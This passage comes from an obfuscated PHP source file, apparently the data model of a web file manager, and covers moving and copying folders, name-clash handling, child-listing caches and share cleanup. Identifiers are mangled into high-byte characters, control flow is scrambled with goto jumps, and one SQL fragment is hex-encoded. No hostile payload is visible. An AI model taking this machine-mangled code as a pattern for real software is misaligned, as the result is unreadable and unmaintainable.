$this->_childrenListCache[$a†Óƒ­¤¥¦][$aÚ«ÈˆÂİ] = $F¨Œ»–•À; $this->_childrenItemCache[$aÚ«ÈˆÂİ] = $F¨Œ»–•À; } goto DœÃœ«¸¬à; d³ôœŞ£ÚÚ: $d²±·¡Ô¶ä = array($eêŸ¢”×…[524] => array($eêŸ¢”×…[547], $BäŠ¨³”¶Œ[$eêŸ¢”×…[524]] . $aÚ«ÈˆÂİ . $eêŸ¢”×…[548]), $eêŸ¢”×…[434] => $this->targetIsDelete); $b×¸ÏŠ‡·ã = $this->field($bÑè‚Ü†¤˜)->where($d²±·¡Ô¶ä)->select(); if (!$b×¸ÏŠ‡·ã) { return; } goto dâª«»Ó»; F²‹¹°é“: $eêŸ¢”×… =& $_SERVER[œÕÊİğö]; $BäŠ¨³”¶Œ = $this->sourceInfo($aÚ«ÈˆÂİ); $bÑè‚Ü†¤˜ = $eêŸ¢”×…[592]; goto d³ôœŞ£ÚÚ; DœÃœ«¸¬à: } private function _childrenListAll($Fòé³®„ÒØ, &$F†‰–©¦™ƒ) { $bÃ¥‡ÇÄ• =& $_SERVER[œÕÊİğö]; if (!isset($this->_childrenListCache[$Fòé³®„ÒØ])) { return; } $dÎ‘Îå‰†· = $this->_childrenListCache[$Fòé³®„ÒØ]; foreach ($dÎ‘Îå‰†· as $f—ª¦ğ›‚¯ => $eéñÙŒùßã) { $F†‰–©¦™ƒ[$f—ª¦ğ›‚¯] = $eéñÙŒùßã; if ($eéñÙŒùßã[$bÃ¥‡ÇÄ•[414]] == $bÃ¥‡ÇÄ•[97]) { $this->_childrenListAll($f—ª¦ğ›‚¯, $F†‰–©¦™ƒ); } } } private function sourceInfoCache($D„ãçø÷»¼) { if (isset($this->_childrenItemCache[$D„ãçø÷»¼])) { return $this->_childrenItemCache[$D„ãçø÷»¼]; } return $this->sourceInfo($D„ãçø÷»¼); } private function _childrenList($fÚˆùãáÑ ) { if (isset($this->_childrenListCache[$fÚˆùãáÑ ])) { return $this->_childrenListCache[$fÚˆùãáÑ ]; } return $this->_childrenListSelect($fÚˆùãáÑ ); } private function _childrenListSelect($fÎ„…÷Ç‡‰) { goto B­¾Œ·º“; B­¾Œ·º“: $D‘Çá‡É¬Ë =& $_SERVER[œÕÊİğö]; $B•ô‘ÌÙÛ = array($D‘Çá‡É¬Ë[501] => $fÎ„…÷Ç‡‰, $D‘Çá‡É¬Ë[434] => $this->targetIsDelete); $a»¡ÌœÌîà = $this->where($B•ô‘ÌÙÛ)->select(); goto f“À§÷¯­±; f“À§÷¯­±: $a»¡ÌœÌîà = $a»¡ÌœÌîà ? $a»¡ÌœÌîà : array(); $D¦Ï†‚ÅŸÍ = array_to_keyvalue($a»¡ÌœÌîà, $D‘Çá‡É¬Ë[406]); $this->_childrenListCache[$fÎ„…÷Ç‡‰] = $D¦Ï†‚ÅŸÍ; goto B­ŸğùØï; B­ŸğùØï: foreach ($D¦Ï†‚ÅŸÍ as $fÎ„…÷Ç‡‰ => $E’Œì¥›øÊ) { $this->_childrenItemCache[$fÎ„…÷Ç‡‰] = $E’Œì¥›øÊ; } return $D¦Ï†‚ÅŸÍ; goto d°‘†ÜÄ¿ó; d°‘†ÜÄ¿ó: } private function fileNameExistCache($c‹ÁÅÉˆÖÚ, $aàÔÎÏåç) { $cÈàê¥­ªµ =& $_SERVER[œÕÊİğö]; $aàÔÎÏåç = strtolower($aàÔÎÏåç); $a•öÄ¸·†· = $this->_childrenList($c‹ÁÅÉˆÖÚ); foreach ($a•öÄ¸·†· as $c«ÂàÛŠÁ¤) { if ($aàÔÎÏåç == strtolower($c«ÂàÛŠÁ¤[$cÈàê¥­ªµ[38]])) { return $c«ÂàÛŠÁ¤[$cÈàê¥­ªµ[406]]; } } return !1; } private function fileNameAutoCache($Aï¶©Ùõ¯Ô, $EÕ…Ì„£©â, $BÂ¿‰¢œ±, $B»ä¼óÕ×³) { $E‰´Š¯ƒÃª =& $_SERVER[œÕÊİğö]; $aƒñï”÷¥“ = $this->_childrenList($Aï¶©Ùõ¯Ô); $c²³­«˜ô‰ = array_to_keyvalue($aƒñï”÷¥“, $E‰´Š¯ƒÃª[43], $E‰´Š¯ƒÃª[38]); return $this->fileNameAutoGet($c²³­«˜ô‰, $EÕ…Ì„£©â, $BÂ¿‰¢œ±, $B»ä¼óÕ×³); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($DšİâÕø¿×, $D»Í½Í’›, $bãÕ’½ÒÄŸ = REPEAT_REPLACE, $a‰Ñ¨–¾’Á = '') { goto bƒë‘Ñè‘”; bƒë‘Ñè‘”: $AÌ²¾áÀÅ… =& $_SERVER[œÕÊİğö]; $E—‡©ğ¹ñĞ = $this->sourceInfo($DšİâÕø¿×); $AÃà—ÛãîÒ = $this->sourceInfo($D»Í½Í’›); goto a„ÔÏ“‚Õ; B†‰¯³®: return $A¬á„·‹¡Ğ; goto F¾«×êêˆÜ; cğˆ†¥‰ÀÛ: if ($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[501]] == $D»Í½Í’› && $a‰Ñ¨–¾’Á != $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[38]]) { $DàŒ È™¢ô = $this->fileNameExist($D»Í½Í’›, $a‰Ñ¨–¾’Á); if ($DàŒ È™¢ô && $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[414]] == $AÌ²¾áÀÅ…[201]) { goto bïÛ›Ü¹´; bïÛ›Ü¹´: $aò—¡°½ = $this->sourceInfo($DàŒ È™¢ô); $aåŸ†èÄëÌ = $this->fileHistory($aò—¡°½, $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[470]], $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[88]]); if (!$aåŸ†èÄëÌ) { Model($AÌ²¾áÀÅ…[473])->remove($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[470]]); } goto F¼—ôÔÖ…Á; Bàœ¾‰ÚµÒ: return $DàŒ È™¢ô; goto f¼¸Õ„÷áÇ; F¼—ôÔÖ…Á: $this->removeNow($DšİâÕø¿×, !1); $this->folderSizeReset($D»Í½Í’›); Hook::trigger($AÌ²¾áÀÅ…[594], $AíĞæœ¿‹); goto Bàœ¾‰ÚµÒ; f¼¸Õ„÷áÇ: } } $F°º®ŞØ¼ = $a‰Ñ¨–¾’Á ? $a‰Ñ¨–¾’Á : $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[38]]; $this->lockMoveStart($DšİâÕø¿×); goto F…ïª–‹ßÀ; F…ïª–‹ßÀ: $this->lockWriteStart($D»Í½Í’›, $F°º®ŞØ¼); $eïç³Úåß = array($AÌ²¾áÀÅ…[563] => array(), $AÌ²¾áÀÅ…[595] => !1); $this->clearShare($DšİâÕø¿×, $D»Í½Í’›); goto CéÕÜšî¶; c‡¿Àßì¬: $this->updateModifyTime($dó¿ÃñÔƒŞ); Model($AÌ²¾áÀÅ…[567])->eventMove($DšİâÕø¿×, $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[501]], $D»Í½Í’›); Hook::trigger($AÌ²¾áÀÅ…[594], $AíĞæœ¿‹); goto B†‰¯³®; e˜›‹¼ˆŠ½: $this->lockMoveEnd($DšİâÕø¿×); $this->lockWriteEnd($D»Í½Í’›, $F°º®ŞØ¼); $this->folderSizeReset($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[501]]); goto FÍ‡›ˆÄ™î; FÍ‡›ˆÄ™î: $this->folderSizeReset($D»Í½Í’›); $dó¿ÃñÔƒŞ = array($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[501]], $D»Í½Í’›); if ($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[414]] == $AÌ²¾áÀÅ…[97]) { $dó¿ÃñÔƒŞ[] = $DšİâÕø¿×; } goto c‡¿Àßì¬; D©ÜîóÑ¥í: if (!$E—‡©ğ¹ñĞ || !$AÃà—ÛãîÒ || $AÃà—ÛãîÒ[$AÌ²¾áÀÅ…[414]] != $AÌ²¾áÀÅ…[97]) { return !1; } Hook::trigger($AÌ²¾áÀÅ…[593], $AíĞæœ¿‹); $this->targetIsDelete = intval($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[434]]); goto cğˆ†¥‰ÀÛ; CéÕÜšî¶: $c³¹íÂØïÛ = $this->fileNameExistCache($D»Í½Í’›, $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[38]]); $A¬á„·‹¡Ğ = $this->_move($DšİâÕø¿×, $D»Í½Í’›, $bãÕ’½ÒÄŸ, $eïç³Úåß, $a‰Ñ¨–¾’Á); $this->sourceCacheClear(); goto a¼‘×»ÚÃ; a¼‘×»ÚÃ: if ($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[414]] == $AÌ²¾áÀÅ…[97] && $c³¹íÂØïÛ) { $this->folderSizeResetChildren($A¬á„·‹¡Ğ); } Model($AÌ²¾áÀÅ…[203])->linkAdd($eïç³Úåß[$AÌ²¾áÀÅ…[563]]); if ($c³¹íÂØïÛ && $eïç³Úåß[$AÌ²¾áÀÅ…[595]]) { $this->removeNow($DšİâÕø¿×, !1); } goto e˜›‹¼ˆŠ½; a„ÔÏ“‚Õ: if ($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[501]] == $AÃà—ÛãîÒ[$AÌ²¾áÀÅ…[406]]) { if ($E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[434]] == $AÌ²¾áÀÅ…[97]) { Model($AÌ²¾áÀÅ…[432])->restore(array($DšİâÕø¿×)); } if (!$a‰Ñ¨–¾’Á || $a‰Ñ¨–¾’Á == $E—‡©ğ¹ñĞ[$AÌ²¾áÀÅ…[38]]) { return $DšİâÕø¿×; } } $AíĞæœ¿‹ = $this->pathInfoMore($DšİâÕø¿×); if ($this->isParentOf($DšİâÕø¿×, $D»Í½Í’›)) { return !1; } goto D©ÜîóÑ¥í; F¾«×êêˆÜ: } private function _move($fÏ‘œçÙ”—, $D˜Ñ‡¾‡, $f¨Ïó·“÷Š, &$Fâ“ÀÖã, $CŠõ¦ÂºöÂ = '') { goto BòÚ•¿šˆ; BòÚ•¿šˆ: $D¸˜á¯êË =& $_SERVER[œÕÊİğö]; $d«“‡ÑÇ¦¤ = $this->sourceInfo($fÏ‘œçÙ”—); $B¸ò”ƒ©Ø  = $d«“‡ÑÇ¦¤[$D¸˜á¯êË[414]] == $D¸˜á¯êË[97]; goto C‡®é™·„Ä; D¾Å ¨ ô­: return $aÜá¡Ü¬î; goto f¨äÏøóŒ¶; C‡®é™·„Ä: $c«½˜äß˜ = $CŠõ¦ÂºöÂ ? $CŠõ¦ÂºöÂ : $d«“‡ÑÇ¦¤[$D¸˜á¯êË[38]]; $Fê¨·Ó×Éë = $this->fileNameExistCache($D˜Ñ‡¾‡, $c«½˜äß˜); $this->lockMoveStart($fÏ‘œçÙ”—); goto dÓƒÏ¨°å; dÓƒÏ¨°å: $this->lockWriteStart($D˜Ñ‡¾‡, $c«½˜äß˜); if (!$Fê¨·Ó×Éë) { return $this->_moveForce($fÏ‘œçÙ”—, $D˜Ñ‡¾‡, $c«½˜äß˜); } $aÜá¡Ü¬î = $Fê¨·Ó×Éë; goto E ¾Ò’î¡; E ¾Ò’î¡: $CóÚÄ¼ÅÙÖ = !1; if ($B¸ò”ƒ©Ø ) { if ($f¨Ïó·“÷Š == REPEAT_RENAME_FOLDER) { $c«½˜äß˜ = $this->fileNameAuto($D˜Ñ‡¾‡, $c«½˜äß˜, $f¨Ïó·“÷Š, $B¸ò”ƒ©Ø ); $aÜá¡Ü¬î = $this->_moveForce($fÏ‘œçÙ”—, $D˜Ñ‡¾‡, $c«½˜äß˜); } else { if ($f¨Ïó·“÷Š == REPEAT_RENAME_FOLDER) { $f¨Ïó·“÷Š = REPEAT_RENAME; } $A‡®îê¿Ÿ¹ = $this->_childrenListSelect($fÏ‘œçÙ”—); foreach ($A‡®îê¿Ÿ¹ as $Aã¥¯÷¶Ôâ) { $this->_move($Aã¥¯÷¶Ôâ[$D¸˜á¯êË[406]], $Fê¨·Ó×Éë, $f¨Ïó·“÷Š, $Fâ“ÀÖã); } $CóÚÄ¼ÅÙÖ = !0; } } else { if ($f¨Ïó·“÷Š == REPEAT_SKIP) { $CóÚÄ¼ÅÙÖ = !0; } else { if ($f¨Ïó·“÷Š == REPEAT_RENAME || $f¨Ïó·“÷Š == REPEAT_RENAME_FOLDER) { $c«½˜äß˜ = $this->fileNameAuto($D˜Ñ‡¾‡, $c«½˜äß˜, $f¨Ïó·“÷Š, $B¸ò”ƒ©Ø ); $aÜá¡Ü¬î = $this->_moveForce($fÏ‘œçÙ”—, $D˜Ñ‡¾‡, $c«½˜äß˜); } else { if ($f¨Ïó·“÷Š == REPEAT_REPLACE) { $c“Ó¬Ëø„Ï = $this->sourceInfoCache($Fê¨·Ó×Éë); $b©ÆÓƒ±¢Œ = $this->fileHistory($c“Ó¬Ëø„Ï, $d«“‡ÑÇ¦¤[$D¸˜á¯êË[470]], $d«“‡ÑÇ¦¤[$D¸˜á¯êË[88]]); $CóÚÄ¼ÅÙÖ = !0; if ($b©ÆÓƒ±¢Œ) { $Fâ“ÀÖã[$D¸˜á¯êË[563]][] = $d«“‡ÑÇ¦¤[$D¸˜á¯êË[470]]; } } } } } if ($CóÚÄ¼ÅÙÖ && !$Fâ“ÀÖã[$D¸˜á¯êË[595]]) { $Fâ“ÀÖã[$D¸˜á¯êË[595]] = !0; } goto D¾Å ¨ ô­; f¨äÏøóŒ¶: } private function _moveForce($E­òĞìçÄ¾, $AÄ£–¯²•ó, $B¥âÁë¯¿) { goto Eœ®‹Šõ§Ş; Eñç…Å•ØÆ: $B™æ¬½Öê˜ = $aÙßÄŒ¡à[$B­œ±Œ™ç‡[414]] == $B­œ±Œ™ç‡[97]; $d¨±µæ‡å‘ = array($B­œ±Œ™ç‡[405] => $BÛº†åŠè[$B­œ±Œ™ç‡[406]], $B­œ±Œ™ç‡[587] => $BÛº†åŠè[$B­œ±Œ™ç‡[524]] . $BÛº†åŠè[$B­œ±Œ™ç‡[406]] . $B­œ±Œ™ç‡[57], $B­œ±Œ™ç‡[583] => $BÛº†åŠè[$B­œ±Œ™ç‡[415]], $B­œ±Œ™ç‡[584] => $BÛº†åŠè[$B­œ±Œ™ç‡[507]], $B­œ±Œ™ç‡[586] => USER_ID, $B­œ±Œ™ç‡[424] => $B¥âÁë¯¿); $aŞß¼Ú¶· = $aÙßÄŒ¡à[$B­œ±Œ™ç‡[415]] == SourceModel::TYPE_GROUP && $BÛº†åŠè[$B­œ±Œ™ç‡[415]] == SourceModel::TYPE_GROUP && $aÙßÄŒ¡à[$B­œ±Œ™ç‡[507]] == $BÛº†åŠè[$B­œ±Œ™ç‡[507]]; goto C²·‹ÙØš‚; C²·‹ÙØš‚: if (!$aŞß¼Ú¶· && $this->moveClearAuth) { Model($B­œ±Œ™ç‡[505])->authClear($E­òĞìçÄ¾); } $AÒˆ”¾‘ö§ = $aÙßÄŒ¡à[$B­œ±Œ™ç‡[434]] == $B­œ±Œ™ç‡[97] && $BÛº†åŠè[$B­œ±Œ™ç‡[434]] != $B­œ±Œ™ç‡[97]; if ($AÒˆ”¾‘ö§) { $d¨±µæ‡å‘[$B­œ±Œ™ç‡[433]] = 0; } goto CÀ…šŸŒ¤š; CÀ…šŸŒ¤š: if ($B™æ¬½Öê˜) { $DÕ ±¯šÏí = array($B­œ±Œ™ç‡[587] => array($B­œ±Œ™ç‡[547], $aÙßÄŒ¡à[$B­œ±Œ™ç‡[524]] . $aÙßÄŒ¡à[$B­œ±Œ™ç‡[406]] . $B­œ±Œ™ç‡[548])); $d‡ÅÀ‘¨­ñ = $aÙßÄŒ¡à[$B­œ±Œ™ç‡[524]] . $aÙßÄŒ¡à[$B­œ±Œ™ç‡[406]] . $B­œ±Œ™ç‡[57]; $a¬Í”®»Î = $BÛº†åŠè[$B­œ±Œ™ç‡[524]] . $BÛº†åŠè[$B­œ±Œ™ç‡[406]] . $B­œ±Œ™ç‡[57] . $aÙßÄŒ¡à[$B­œ±Œ™ç‡[406]] . $B­œ±Œ™ç‡[57]; $Eí•µÉâ® = array($B­œ±Œ™ç‡[587] => array($B­œ±Œ™ç‡[596], "\x72\x65\160\154\141\143\x65\x28\160\x61\x72\x65\156\x74\x4c\145\166\x65\x6c\54\47{$d‡ÅÀ‘¨­ñ}\47\54\x27{$a¬Í”®»Î}\x27\51"), $B­œ±Œ™ç‡[583] => $BÛº†åŠè[$B­œ±Œ™ç‡[415]], $B­œ±Œ™ç‡[584] => $BÛº†åŠè[$B­œ±Œ™ç‡[507]]); if ($AÒˆ”¾‘ö§) { $Eí•µÉâ®[$B­œ±Œ™ç‡[433]] = 0; } $this->where($DÕ ±¯šÏí)->data($Eí•µÉâ®)->save(); } $this->where(array($B­œ±Œ™ç‡[421] => $E­òĞìçÄ¾))->data($d¨±µæ‡å‘)->save(); return $E­òĞìçÄ¾; goto BáˆàÑÀ†; Eœ®‹Šõ§Ş: $B­œ±Œ™ç‡ =& $_SERVER[œÕÊİğö]; $aÙßÄŒ¡à = $this->sourceInfo($E­òĞìçÄ¾); $BÛº†åŠè = $this->sourceInfo($AÄ£–¯²•ó); goto Eñç…Å•ØÆ; BáˆàÑÀ†: } private function clearShare($fÔ”ÏÄ¸“¹, $fº¶»¯ÄÕ) { goto b™¡èİÂÌÎ; E¯ù¿Õ®ˆ : if (!$F…ìÄ³Ãê) { return; } $a†¶Ä¿† Œ = array($bÑ‹—ãŞæ[406] => array($bÑ‹—ãŞæ[7], $F…ìÄ³Ãê), $bÑ‹—ãŞæ[498] => 1); $cì¢ñ¯’ğ„ = Model($bÑ‹—ãŞæ[598])->field($bÑ‹—ãŞæ[491])->where($a†¶Ä¿† Œ)->select(); goto E×•à’Àè­; b™¡èİÂÌÎ: $bÑ‹—ãŞæ =& $_SERVER[œÕÊİğö]; $d¿—×Ç¥µô = $this->sourceInfo($fÔ”ÏÄ¸“¹); $AİÀ¬£…ïó = $this->sourceInfo($fº¶»¯ÄÕ); goto fÑÙô‚ºÔø; DÇ½…ğÏÛƒ: Model($bÑ‹—ãŞæ[598])->where($a†¶Ä¿† Œ)->save(array($bÑ‹—ãŞæ[498] => 0)); Model($bÑ‹—ãŞæ[599])->where($a†¶Ä¿† Œ)->delete(); goto a‰ŠÜ„¾è; fÑÙô‚ºÔø: if ($d¿—×Ç¥µô[$bÑ‹—ãŞæ[507]] == $AİÀ¬£…ïó[$bÑ‹—ãŞæ[507]] && $d¿—×Ç¥µô[$bÑ‹—ãŞæ[415]] == $bÑ‹—ãŞæ[597]) { return; } $a†¶Ä¿† Œ = array($bÑ‹—ãŞæ[524] => array($bÑ‹—ãŞæ[547], $d¿—×Ç¥µô[$bÑ‹—ãŞæ[524]] . $fÔ”ÏÄ¸“¹ . $bÑ‹—ãŞæ[548])); $F…ìÄ³Ãê = $this->field($bÑ‹—ãŞæ[421])->where($a†¶Ä¿† Œ)->getField($bÑ‹—ãŞæ[406], !0); goto E¯ù¿Õ®ˆ ; E×•à’Àè­: if (!$cì¢ñ¯’ğ„) { return; } $cì¢ñ¯’ğ„ = array_to_keyvalue($cì¢ñ¯’ğ„, $bÑ‹—ãŞæ[43], $bÑ‹—ãŞæ[491]); $a†¶Ä¿† Œ = array($bÑ‹—ãŞæ[491] => array($bÑ‹—ãŞæ[7], $cì¢ñ¯’ğ„)); goto DÇ½…ğÏÛƒ; a‰ŠÜ„¾è: } public function copyFolderFromIO($e„çäÜ¯´ğ, $cÛè¨Ê©, $A¥‹¶Ó„Ë½, $D‰ĞøÌŠ®í, $aÒè™÷ÙÑè, $e¡çÕÙ›Í‡ = false) { goto cÙÅ¡Ò±”Ç; dŠÅÁ‹‘Å¯: $this->updateModifyTime($A¥‹¶Ó„Ë½); return $BŞà‰¯É™³; goto c­ùÔäÂœ˜; E›ƒËÀğŒ•: $E³²†»¿Ï = $this->fileNameExist($A¥‹¶Ó„Ë½, $e¿®¨•á´½); $BŞà‰¯É™³ = $this->mkdir($A¥‹¶Ó„Ë½, $e¿®¨•á´½, $D‰ĞøÌŠ®í); if (!$E³²†»¿Ï || $D‰ĞøÌŠ®í == REPEAT_RENAME_FOLDER) { $D‰ĞøÌŠ®í = !1; } goto dÅŒê˜ï¦; C™‰ÖÈç™: Model($C·‚ğ‹İÍœ[566])->addAll($eíÈš‹ïƒÆ[$C·‚ğ‹İÍœ[564]], array(), !0); Model($C·‚ğ‹İÍœ[567])->eventCopy($BŞà‰¯É™³); $this->saveAll($eíÈš‹ïƒÆ[$C·‚ğ‹İÍœ[565]]); goto E‚©µÖë¿; E‚©µÖë¿: Model($C·‚ğ‹İÍœ[473])->linkAdd($eíÈš‹ïƒÆ[$C·‚ğ‹İÍœ[563]]); Model($C·‚ğ‹İÍœ[473])->remove($eíÈš‹ïƒÆ[$C·‚ğ‹İÍœ[600]]); $this->folderSizeReset($A¥‹¶Ó„Ë½); goto dŠÅÁ‹‘Å¯; dÅŒê˜ï¦: if ($E³²†»¿Ï) { $this->_childrenAllMake($E³²†»¿Ï); } Hook::trigger($C·‚ğ‹İÍœ[601]); $this->_copyChildTo($e„çäÜ¯´ğ, $cÛè¨Ê©, $BŞà‰¯É™³, $D‰ĞøÌŠ®í, $eíÈš‹ïƒÆ, $aÒè™÷ÙÑè); goto A¼ÏÆ¼§±Ã; cÙÅ¡Ò±”Ç: $C·‚ğ‹İÍœ =& $_SERVER[œÕÊİğö]; $eíÈš‹ïƒÆ = array($C·‚ğ‹İÍœ[564] => array(), $C·‚ğ‹İÍœ[565] => array(), $C·‚ğ‹İÍœ[563] => array(), $C·‚ğ‹İÍœ[600] => array()); $e¿®¨•á´½ = $e¡çÕÙ›Í‡ ? $e¡çÕÙ›Í‡ : $e„çäÜ¯´ğ->pathThis($cÛè¨Ê©); goto E›ƒËÀğŒ•; A¼ÏÆ¼§±Ã: Hook::trigger($C·‚ğ‹İÍœ[602]); if ($BŞà‰¯É™³) { $this->folderSizeResetChildren($BŞà‰¯É™³); } $this->_childrenListClear(); goto C™‰ÖÈç™; c­ùÔäÂœ˜: } private function _copyChildTo($d­¹²Ò–ã, $Eò÷Ù¯çÆá, $e³¿‘¹Ÿïˆ, $D¼˜Ëã²¶¥, &$Cùˆ²š±¿©, $AƒËÖè¯ã) { goto eñŞæµ¢ôÂ; CäÔÎ‰¬ƒ: foreach ($F¬İœ¸ğÌ» as $aã•Ù¹„‡×) { $a‹áŠÉÑÛ = $e‰ôà„İãÚ[$aã•Ù¹„‡×[$D·¾¨Æ·èá[38]]]; $dåšù¬º´ = $a‹áŠÉÑÛ[$D·¾¨Æ·èá[406]]; $this->_copyApplyMeta($a‹áŠÉÑÛ, $Cùˆ²š±¿©); if ($aã•Ù¹„‡×[$D·¾¨Æ·èá[39]] == $D·¾¨Æ·èá[87]) { $aã•Ù¹„‡×[$D·¾¨Æ·èá[86]] = $d­¹²Ò–ã->getPathInner($aã•Ù¹„‡×[$D·¾¨Æ·èá[86]]); $this->_copyChildTo($d­¹²Ò–ã, $aã•Ù¹„‡×[$D·¾¨Æ·èá[86]], $dåšù¬º´, $D¼˜Ëã²¶¥, $Cùˆ²š±¿©, $AƒËÖè¯ã); } } goto CÁ”Î—äá¸; b–ë»ëˆİÄ: $bˆÓ‚Àôãã = array(); foreach ($F¬İœ¸ğÌ» as &$aã•Ù¹„‡×) { goto CÁ¹½‰ÀŸÅ; CÁ¹½‰ÀŸÅ: if (isset($b¬§êé·„[$aã•Ù¹„‡×[$D·¾¨Æ·èá[38]]])) { $aã•Ù¹„‡× = $b¬§êé·„[$aã•Ù¹„‡×[$D·¾¨Æ·èá[38]]]; } $aã•Ù¹„‡×[$D·¾¨Æ·èá[414]] = $aã•Ù¹„‡×[$D·¾¨Æ·èá[39]] == $D·¾¨Æ·èá[87]; $aã•Ù¹„‡×[$D·¾¨Æ·èá[416]] = _get($aã•Ù¹„‡×, $D·¾¨Æ·èá[178], $D·¾¨Æ·èá[43]); goto bêİ­àƒ™§; C¾²èù™Øö: if ($D¼˜Ëã²¶¥) { $D‹ÁÏòÖğ = $this->fileNameExistCache($e³¿‘¹Ÿïˆ, $aã•Ù¹„‡×[$D·¾¨Æ·èá[38]]); if ($D‹ÁÏòÖğ) { if ($aã•Ù¹„‡×[$D·¾¨Æ·èá[414]] || $D¼˜Ëã²¶¥ == REPEAT_SKIP) { continue; } if ($D¼˜Ëã²¶¥ == REPEAT_REPLACE) { $a‹áŠÉÑÛ = $this->sourceInfoCache($D‹ÁÏòÖğ); $Eºˆê¡µšÑ = $this->fileHistory($a‹áŠÉÑÛ, $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]], $aã•Ù¹„‡×[$D·¾¨Æ·èá[88]]); if ($Eºˆê¡µšÑ) { $Cùˆ²š±¿©[$D·¾¨Æ·èá[563]][] = $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]]; } continue; } else { if ($D¼˜Ëã²¶¥ == REPEAT_RENAME) { $aã•Ù¹„‡×[$D·¾¨Æ·èá[38]] = $this->fileNameAutoCache($e³¿‘¹Ÿïˆ, $aã•Ù¹„‡×[$D·¾¨Æ·èá[38]], $D¼˜Ëã²¶¥, !1); } } } } if (!$aã•Ù¹„‡×[$D·¾¨Æ·èá[414]] && $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]]) { $Cùˆ²š±¿©[$D·¾¨Æ·èá[563]][] = $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]]; } $bˆÓ‚Àôãã[] = $this->_makeItemData($aã•Ù¹„‡×, $BøÍé™©á, $aã•Ù¹„‡×[$D·¾¨Æ·èá[38]]); goto e¨ğ·ºÜ®°; bêİ­àƒ™§: $aã•Ù¹„‡×[$D·¾¨Æ·èá[88]] = _get($aã•Ù¹„‡×, $D·¾¨Æ·èá[88], 0); $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]] = _get($aã•Ù¹„‡×, $D·¾¨Æ·èá[470], 0); if (!isset($aã•Ù¹„‡×[$D·¾¨Æ·èá[603]]) && $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]]) { $Cùˆ²š±¿©[$D·¾¨Æ·èá[600]][] = $aã•Ù¹„‡×[$D·¾¨Æ·èá[470]]; } goto C¾²èù™Øö; e¨ğ·ºÜ®°: } unset($aã•Ù¹„‡×); goto DÃß©ÅŠ¾ˆ; DÃß©ÅŠ¾ˆ: if (!empty($bˆÓ‚Àôãã)) { $this->addAll($bˆÓ‚Àôãã); $this->_childrenListSelect($e³¿‘¹Ÿïˆ); } $e‰ôà„İãÚ = $this->_childrenList($e³¿‘¹Ÿïˆ); $e‰ôà„İãÚ = array_to_keyvalue($e‰ôà„İãÚ, $D·¾¨Æ·èá[38]); goto CäÔÎ‰¬ƒ; d¡œ‡ËËò²: $B ¢¨Ÿëà” = $B ¢¨Ÿëà” ? $B ¢¨Ÿëà” : array($D·¾¨Æ·èá[84] => array(), $D·¾¨Æ·èá[85] => array()); $F¬İœ¸ğÌ» = array_merge($B ¢¨Ÿëà”[$D·¾¨Æ·èá[84]], $B ¢¨Ÿëà”[$D·¾¨Æ·èá[85]]); $b¬§êé·„ = $this->_addFiles($d­¹²Ò–ã, $B ¢¨Ÿëà”[$D·¾¨Æ·èá[84]], $AƒËÖè¯ã); goto b–ë»ëˆİÄ; eñŞæµ¢ôÂ: $D·¾¨Æ·èá =& $_SERVER[œÕÊİğö]; $BøÍé™©á = $this->sourceInfoCache($e³¿‘¹Ÿïˆ); $B ¢¨Ÿëà” = $d­¹²Ò–ã->listPath($Eò÷Ù¯çÆá); goto d¡œ‡ËËò²; CÁ”Î—äá¸: } private function _addFiles($bàÍ‹˜†ù, $Eë¢ò¦¬‰¾, $fÚ’Õéìî‘) { goto cØë¤…ğõ÷; e¼Ñ¸‡ÀÈ½: $dçó¯¹À» = Model($B„ã‰ÅÜôİ[606]); $fâŒæö®Ô = $dçó¯¹À»->where($eñ´Àğ“™µ)->select(); $fâŒæö®Ô = $fâŒæö®Ô ? $fâŒæö®Ô : array(); goto b óƒÜã³¶; b½Œ‘†‹£: foreach ($Eë¢ò¦¬‰¾ as $fÉñ•Àé—‡) { $bëá´±è¤ê[$fÉñ•Àé—‡[$B„ã‰ÅÜôİ[38]]] = $fÉñ•Àé—‡; } return $bëá´±è¤ê; goto EôŞ¿Ş¼‹; c¸Å¥¡«ä¦: $dçó¯¹À»->addAll($dÅÉÒÒè¬); $eñ´Àğ“™µ = array($B„ã‰ÅÜôİ[180] => array($B„ã‰ÅÜôİ[7], array_keys($EôÁÏ²¿‘))); $fâŒæö®Ô = $dçó¯¹À»->where($eñ´Àğ“™µ)->select(); goto F˜æÎöÄíÈ; cØë¤…ğõ÷: $B„ã‰ÅÜôİ =& $_SERVER[œÕÊİğö]; if (!$Eë¢ò¦¬‰¾ || count($Eë¢ò¦¬‰¾) == 0) { return array(); } $EôÁÏ²¿‘ = array(); goto f™êŠó¶Éë; F˜æÎöÄíÈ: $fâŒæö®Ô = $fâŒæö®Ô ? $fâŒæö®Ô : array(); foreach ($fâŒæö®Ô as $Dø©–…·Šï) { if (!isset($EôÁÏ²¿‘[$Dø©–…·Šï[$B„ã‰ÅÜôİ[180]]])) { continue; } $e­Ÿ³²×£ï =& $EôÁÏ²¿‘[$Dø©–…·Šï[$B„ã‰ÅÜôİ[180]]]; foreach ($e­Ÿ³²×£ï as &$C‹íóùÆŠ) { $C‹íóùÆŠ[$B„ã‰ÅÜôİ[470]] = $Dø©–…·Šï[$B„ã‰ÅÜôİ[470]]; } unset($C‹íóùÆŠ); } $bëá´±è¤ê = array(); goto 